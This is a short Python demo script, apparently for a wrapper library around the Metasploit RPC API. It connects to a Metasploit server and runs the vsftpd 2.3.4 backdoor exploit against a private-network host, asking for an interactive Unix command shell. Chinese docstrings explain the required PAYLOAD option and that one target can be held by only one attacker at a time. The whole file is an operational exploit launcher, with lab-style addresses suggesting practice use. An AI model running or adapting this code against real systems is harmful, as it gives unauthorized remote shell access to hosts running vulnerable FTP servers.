from zdppy_metasploit import *

msf = new_metasploit(host="192.168.213.131", port=55553)


def demo1():
    """
    注意：
        1、参数必须加PAYLOAD，否则无法创建任务成功
        2、同一个受控主机，这个漏洞只能同时被一个攻击机利用，如果被占用，则不会有session
    """
    opts = {'RHOSTS': '192.168.160.130', "PAYLOAD": "cmd/unix/interact"}
    msf.log.info(msf.call("module.execute", ['exploit', 'unix/ftp/vsftpd_234_backdoor', opts]))


def demo2():
    """
    利用漏洞
    """
    msf.log.info(msf.use(
        module_type='exploit',
        module_name='unix/ftp/vsftpd_234_backdoor',
        rhosts='192.168.160.130',
        payload="cmd/unix/interact"
    ))


if __name__ == '__main__':
    # demo1()
    demo2()
